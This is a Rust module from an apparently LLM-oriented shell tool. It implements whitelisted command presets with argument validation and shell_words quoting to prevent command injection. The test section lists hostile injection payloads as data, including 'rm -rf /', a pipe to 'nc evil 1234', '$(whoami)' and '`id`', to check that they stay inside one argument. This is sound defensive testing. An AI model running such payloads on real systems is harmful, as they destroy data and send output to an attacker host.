//! `apeireth-tool-shell::preset` — ShellPreset 预设命令模板机制 (TP4/N22, §10 官方包最后一件).
//!
//! 来源: 主人设计蓝图对照 (R136): 「VCP preset 机制 (preset:预设名?参数) 值得保留 —
//! 减少 LLM 记忆成本」。预设名展开为完整命令模板, LLM 只需记预设名+参数, 不记命令全文。
//!
//! 三道防线 (防注入):
//! 1. **白名单**: 预设清单显式登记, 非白名单预设名直接拒绝 (UnknownPreset);
//!    预设名只允许 `[a-z][a-z0-9_-]{0,63}`。
//! 2. **模板结构校验**: 模板 = argv 片段数组, 占位符 `{arg}` 必须**独占整个 argv 槽位**
//!    (嵌入式占位符注册时即拒) — 参数永远不与模板文本拼接。
//! 3. **参数独立引用**: 填充走 `shell_words::quote` (单 token 引用), 执行链
//!    `EnhancedShell::exec_sandboxed` → `build_command` 用 `shell_words::split`
//!    解析为 argv 直传 `tokio::process::Command` (不经 shell 解释器) — quote/split
//!    往返闭环保证 `;` `&&` `|` `$()` 等特殊字符只能留在参数值内部, 不产生新命令。
//!
//! 挂接 (不自写 shell 调用): [`PresetShell`] 持 [`crate::enhanced::EnhancedShell`] +
//! [`PresetRegistry`], `exec_preset` = expand → 既有 exec_sandboxed。
//!
//! 0 假装 PASS: ① 预设清单是编译期内置 builtin + register 扩展 (无动态预设文件加载);
//! ② 多签/审批链路不在此处 — 敏感预设由既有 tool-approval/guard 管 (本模块不改其本体)。

use std::collections::HashMap;

use crate::enhanced::{EnhancedShell, ShellError};

/// 参数种类 (占位符校验规格).
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ArgSpec {
    /// 数值参数 (十进制数字, 范围 [min, max]).
    Number {
        /// 最小值 (含).
        min: u64,
        /// 最大值 (含).
        max: u64,
    },
    /// 文本参数 (禁控制字符, 长度 ≤ max_len).
    Text {
        /// 最大长度.
        max_len: usize,
    },
}

/// 预设定义: 名称 + 描述 + argv 模板 (占位符 `{arg}` 独占槽位).
#[derive(Debug, Clone)]
pub struct ShellPreset {
    /// 预设名 (白名单 key).
    pub name: String,
    /// 人类可读描述.
    pub description: String,
    /// argv 模板: 每片段是字面量或整槽位占位符 `{arg}`.
    pub template: Vec<String>,
    /// 参数规格 (与模板占位符一一对应).
    pub args: Vec<(String, ArgSpec)>,
}

/// 预设错误.
#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
pub enum PresetError {
    /// 非白名单预设 (拒绝展开).
    #[error("未知预设 (非白名单): `{0}`")]
    UnknownPreset(String),
    /// 预设名非法 (小写字母开头, [a-z0-9_-], ≤64).
    #[error("预设名非法: `{0}`")]
    InvalidName(String),
    /// 预设重复登记.
    #[error("预设重复登记: `{0}`")]
    DuplicatePreset(String),
    /// 模板非法 (占位符未独占槽位 / 引用了未声明参数 / 无 argv).
    #[error("模板非法: `{0}`")]
    InvalidTemplate(String),
    /// 缺少必需参数.
    #[error("缺少参数: `{0}`")]
    MissingArg(String),
    /// 提供了模板未声明的参数.
    #[error("未声明参数: `{0}`")]
    UnexpectedArg(String),
    /// 参数值不合规 (注入防线: 控制字符/超长/越界).
    #[error("参数 `{name}` 不合规: {reason}")]
    InvalidArg {
        /// 参数名.
        name: String,
        /// 不合规原因.
        reason: String,
    },
}

/// 参数值校验 (返回校验后的原值; 引号由 expand 统一加).
fn validate_arg(name: &str, value: &str, spec: &ArgSpec) -> Result<(), PresetError> {
    match spec {
        ArgSpec::Number { min, max } => {
            let n: u64 = value.parse().map_err(|_| PresetError::InvalidArg {
                name: name.into(),
                reason: format!("非十进制数字: `{value}`"),
            })?;
            if !(*min..=*max).contains(&n) {
                return Err(PresetError::InvalidArg {
                    name: name.into(),
                    reason: format!("{n} 超出范围 [{min}, {max}]"),
                });
            }
            Ok(())
        }
        ArgSpec::Text { max_len } => {
            if value.len() > *max_len {
                return Err(PresetError::InvalidArg {
                    name: name.into(),
                    reason: format!("长度 {} 超限 {max_len}", value.len()),
                });
            }
            if value.chars().any(|c| c.is_control()) {
                return Err(PresetError::InvalidArg {
                    name: name.into(),
                    reason: "含控制字符 (换行/回车等)".into(),
                });
            }
            Ok(())
        }
    }
}

impl ShellPreset {
    /// 登记前校验: 名称 + 模板结构 (占位符独占槽位 + 全部已声明 + argv 非空).
    fn validate(&self) -> Result<(), PresetError> {
        if !valid_preset_name(&self.name) {
            return Err(PresetError::InvalidName(self.name.clone()));
        }
        if self.template.is_empty() {
            return Err(PresetError::InvalidTemplate("模板为空".into()));
        }
        let declared: Vec<&str> = self.args.iter().map(|(n, _)| n.as_str()).collect();
        for seg in &self.template {
            if seg.contains('{') || seg.contains('}') {
                // 必须整槽位 `{name}` — 嵌入式占位符即拼接风险, 注册时拒绝
                let inner = seg.strip_prefix('{').and_then(|s| s.strip_suffix('}'));
                match inner {
                    Some(n) if !n.is_empty() && !declared.contains(&n) => {
                        return Err(PresetError::InvalidTemplate(format!(
                            "占位符引用未声明参数: {seg}"
                        )));
                    }
                    Some(_) => {}
                    None => {
                        return Err(PresetError::InvalidTemplate(format!(
                            "占位符必须独占 argv 槽位: `{seg}`"
                        )))
                    }
                }
            }
        }
        Ok(())
    }

    /// 模板引用的占位符名列表 (按出现顺序).
    fn placeholders(&self) -> Vec<&str> {
        self.template
            .iter()
            .filter_map(|s| s.strip_prefix('{').and_then(|s| s.strip_suffix('}')))
            .collect()
    }
}

fn valid_preset_name(name: &str) -> bool {
    let mut cs = name.chars();
    match cs.next() {
        Some(c) if c.is_ascii_lowercase() => {}
        _ => return false,
    }
    name.len() <= 64
        && cs.all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-' || c == '_')
}

/// 预设注册表 (白名单): 显式登记, 非白名单预设名展开即拒.
pub struct PresetRegistry {
    presets: HashMap<String, ShellPreset>,
}

impl PresetRegistry {
    /// 空注册表.
    pub fn new() -> Self {
        Self {
            presets: HashMap::new(),
        }
    }

    /// 内置白名单预设.
    pub fn builtin() -> Self {
        let mut r = Self::new();
        // 登记失败 = 编码错误, 直接 panic (builtin 是编译期确定的合法预设)
        r.register(ShellPreset {
            name: "git-log-recent".into(),
            description: "最近 N 条提交一行摘要 (git log --oneline -n {count})".into(),
            template: vec![
                "git".into(),
                "log".into(),
                "--oneline".into(),
                "-n".into(),
                "{count}".into(),
            ],
            args: vec![("count".into(), ArgSpec::Number { min: 1, max: 100 })],
        })
        .expect("builtin git-log-recent 登记");
        r.register(ShellPreset {
            name: "git-status-short".into(),
            description: "工作区状态短格式 (git status --short)".into(),
            template: vec!["git".into(), "status".into(), "--short".into()],
            args: vec![],
        })
        .expect("builtin git-status-short 登记");
        r.register(ShellPreset {
            name: "echo-text".into(),
            description: "原样回显一段文本 (验证/演示用, 不经 shell 解释)".into(),
            template: vec!["echo".into(), "{text}".into()],
            args: vec![("text".into(), ArgSpec::Text { max_len: 4096 })],
        })
        .expect("builtin echo-text 登记");
        r
    }

    /// 白名单登记 (名称/模板校验 + 拒绝重复).
    pub fn register(&mut self, preset: ShellPreset) -> Result<(), PresetError> {
        preset.validate()?;
        if self.presets.contains_key(&preset.name) {
            return Err(PresetError::DuplicatePreset(preset.name));
        }
        self.presets.insert(preset.name.clone(), preset);
        Ok(())
    }

    /// 白名单预设名清单.
    pub fn names(&self) -> Vec<&str> {
        self.presets.keys().map(|s| s.as_str()).collect()
    }

    /// 预设定义查询.
    pub fn get(&self, name: &str) -> Option<&ShellPreset> {
        self.presets.get(name)
    }

    /// 展开: 白名单查找 → 参数校验 → quote 填充 → 命令串 (交给既有执行链).
    ///
    /// 防注入核心: 每个参数经 `shell_words::quote` 成为单 token;
    /// 执行链 `build_command` 用 `shell_words::split` 解析 — split(quote(x)) == [x]
    /// 往返闭环, 特殊字符 (`;` `&&` `|` `$()` 等) 无法逃逸出参数边界。
    pub fn expand(&self, name: &str, args: &[(&str, &str)]) -> Result<String, PresetError> {
        let preset = self
            .presets
            .get(name)
            .ok_or_else(|| PresetError::UnknownPreset(name.to_string()))?;
        // 参数表校验: 不缺不多
        let spec_of = |n: &str| preset.args.iter().find(|(an, _)| an == n).map(|(_, s)| s);
        let provided: HashMap<&str, &str> = args.iter().cloned().collect();
        if provided.len() != args.len() {
            return Err(PresetError::UnexpectedArg("参数名重复".into()));
        }
        for (n, _) in &preset.args {
            if !provided.contains_key(n.as_str()) {
                return Err(PresetError::MissingArg(n.clone()));
            }
        }
        for (n, _) in args {
            if spec_of(n).is_none() {
                return Err(PresetError::UnexpectedArg((*n).to_string()));
            }
        }
        // 填充: 字面量直出, 占位符 = 校验 + quote
        let mut parts: Vec<String> = Vec::with_capacity(preset.template.len());
        for seg in &preset.template {
            match seg.strip_prefix('{').and_then(|s| s.strip_suffix('}')) {
                Some(n) if seg.starts_with('{') && seg.ends_with('}') => {
                    let spec = spec_of(n).expect("validate() 已保证占位符均有声明");
                    let value = provided[n];
                    validate_arg(n, value, spec)?;
                    parts.push(shell_words::quote(value).into_owned());
                }
                _ => parts.push(seg.clone()),
            }
        }
        Ok(parts.join(" "))
    }
}

impl Default for PresetRegistry {
    fn default() -> Self {
        Self::new()
    }
}

/// 预设执行器: 预设展开 + 既有执行链 (EnhancedShell::exec_sandboxed, 不自写 shell 调用).
pub struct PresetShell {
    shell: EnhancedShell,
    registry: PresetRegistry,
}

impl PresetShell {
    /// 构造 (注入底层 shell 与预设注册表).
    pub fn new(shell: EnhancedShell, registry: PresetRegistry) -> Self {
        Self { shell, registry }
    }

    /// 预设注册表引用.
    pub fn registry(&self) -> &PresetRegistry {
        &self.registry
    }

    /// 执行预设: expand (白名单+校验+quote) → exec_sandboxed (沙箱+argv 直传).
    pub async fn exec_preset(
        &self,
        name: &str,
        args: &[(&str, &str)],
        timeout_ms: u64,
    ) -> Result<(i32, String), ShellError> {
        let cmd = self
            .registry
            .expand(name, args)
            .map_err(|e| ShellError::Task(e.to_string()))?;
        self.shell.exec_sandboxed(&cmd, timeout_ms).await
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn builtin_registry_has_whitelist() {
        let r = PresetRegistry::builtin();
        let mut names = r.names();
        names.sort_unstable();
        assert_eq!(names, ["echo-text", "git-log-recent", "git-status-short"]);
    }

    #[test]
    fn expand_git_log_recent() {
        let r = PresetRegistry::builtin();
        assert_eq!(
            r.expand("git-log-recent", &[("count", "10")]).unwrap(),
            "git log --oneline -n 10"
        );
        assert_eq!(
            r.expand("git-status-short", &[]).unwrap(),
            "git status --short"
        );
    }

    #[test]
    fn unknown_preset_rejected() {
        let r = PresetRegistry::builtin();
        assert!(matches!(
            r.expand("rm-rf-everything", &[]),
            Err(PresetError::UnknownPreset(_))
        ));
        assert!(matches!(
            r.expand("GIT-LOG-RECENT", &[]),
            Err(PresetError::UnknownPreset(_))
        ));
    }

    #[test]
    fn arg_validation_rejects_bad_values() {
        let r = PresetRegistry::builtin();
        // 非数字
        assert!(matches!(
            r.expand("git-log-recent", &[("count", "abc")]),
            Err(PresetError::InvalidArg { .. })
        ));
        // 越界
        assert!(matches!(
            r.expand("git-log-recent", &[("count", "200")]),
            Err(PresetError::InvalidArg { .. })
        ));
        assert!(matches!(
            r.expand("git-log-recent", &[("count", "0")]),
            Err(PresetError::InvalidArg { .. })
        ));
        // 注入载荷在 Number 槽位直接拒 (非数字)
        assert!(matches!(
            r.expand("git-log-recent", &[("count", "10; rm -rf /")]),
            Err(PresetError::InvalidArg { .. })
        ));
        // 缺参/多参
        assert!(matches!(
            r.expand("git-log-recent", &[]),
            Err(PresetError::MissingArg(_))
        ));
        assert!(matches!(
            r.expand("git-status-short", &[("x", "1")]),
            Err(PresetError::UnexpectedArg(_))
        ));
        // 控制字符 (换行) 拒绝
        assert!(matches!(
            r.expand("echo-text", &[("text", "a\nb")]),
            Err(PresetError::InvalidArg { .. })
        ));
    }

    /// 注入核心用例: 参数含 `;` `&&` `|` `$()` 反引号 — quote/split 往返闭环,
    /// 特殊字符只能留在单个 argv token 内部, 不产生新命令.
    #[test]
    fn injection_payloads_stay_inside_single_token() {
        let r = PresetRegistry::builtin();
        for payload in [
            "a; rm -rf /",
            "a && malicious",
            "a | nc evil 1234",
            "$(whoami)",
            "`id`",
            "a\"b'c",
            "a&b>c<d",
        ] {
            let cmd = r.expand("echo-text", &[("text", payload)]).unwrap();
            // 执行链第一步 build_command 同款解析: split 后 argv 结构不变
            let parts = shell_words::split(&cmd).unwrap();
            assert_eq!(
                parts.len(),
                2,
                "payload `{payload}` 不应产生额外 argv: {parts:?}"
            );
            assert_eq!(parts[0], "echo");
            assert_eq!(
                parts[1], payload,
                "payload `{payload}` 必须原样落在单 token 内"
            );
        }
    }

    #[test]
    fn embedded_placeholder_rejected_at_register() {
        let mut r = PresetRegistry::new();
        // 嵌入式占位符 (与文本拼接) → 注册即拒
        let bad = ShellPreset {
            name: "bad-embed".into(),
            description: "x".into(),
            template: vec!["echo".into(), "prefix-{text}".into()],
            args: vec![("text".into(), ArgSpec::Text { max_len: 10 })],
        };
        assert!(matches!(
            r.register(bad),
            Err(PresetError::InvalidTemplate(_))
        ));
        // 未声明参数 → 拒
        let undeclared = ShellPreset {
            name: "bad-undeclared".into(),
            description: "x".into(),
            template: vec!["echo".into(), "{nope}".into()],
            args: vec![],
        };
        assert!(matches!(
            r.register(undeclared),
            Err(PresetError::InvalidTemplate(_))
        ));
    }

    #[test]
    fn invalid_or_duplicate_name_rejected() {
        let mut r = PresetRegistry::new();
        for name in [
            "Git-Log",
            "9lives",
            "",
            "has space",
            "UPPER",
            "x".repeat(65).as_str(),
        ] {
            let p = ShellPreset {
                name: name.into(),
                description: "x".into(),
                template: vec!["echo".into()],
                args: vec![],
            };
            assert!(
                matches!(r.register(p), Err(PresetError::InvalidName(_))),
                "名称 `{name}` 应拒"
            );
        }
        let p = ShellPreset {
            name: "ok-preset".into(),
            description: "x".into(),
            template: vec!["echo".into()],
            args: vec![],
        };
        r.register(p.clone()).unwrap();
        assert!(matches!(
            r.register(p),
            Err(PresetError::DuplicatePreset(_))
        ));
    }

    #[tokio::test]
    async fn exec_preset_runs_real_command_with_injection_literal() {
        // 真执行: 注入载荷只能作为字面参数回显, 不被解释执行
        let tmp = tempfile::tempdir().unwrap();
        let shell = EnhancedShell::new(tmp.path().join("tasks.db")).unwrap();
        let ps = PresetShell::new(shell, PresetRegistry::builtin());
        let payload = "safe$(not_executed)&&still|literal";
        // Windows: echo 是 cmd 内建 → 走 cmd /c; 此处用预设 echo-text (POSIX echo 二进制)
        if cfg!(windows) {
            // Windows 上 `echo` 不是独立可执行文件 — 验证 expand+split 闭环即可,
            // 真执行用既有链路的 cmd /c 形式另测 (见 enhanced 测试模式)
            let cmd = ps
                .registry()
                .expand("echo-text", &[("text", payload)])
                .unwrap();
            let parts = shell_words::split(&cmd).unwrap();
            assert_eq!(parts[1], payload);
        } else {
            let (code, out) = ps
                .exec_preset("echo-text", &[("text", payload)], 5000)
                .await
                .unwrap();
            assert_eq!(code, 0);
            assert!(
                out.contains("safe$(not_executed)"),
                "注入载荷必须字面回显, got: `{out}`"
            );
        }
    }

    #[tokio::test]
    async fn exec_preset_unknown_rejected_before_exec() {
        let tmp = tempfile::tempdir().unwrap();
        let shell = EnhancedShell::new(tmp.path().join("tasks.db")).unwrap();
        let ps = PresetShell::new(shell, PresetRegistry::builtin());
        let e = ps.exec_preset("not-in-whitelist", &[], 1000).await;
        assert!(matches!(e, Err(ShellError::Task(msg)) if msg.contains("非白名单")));
    }
}
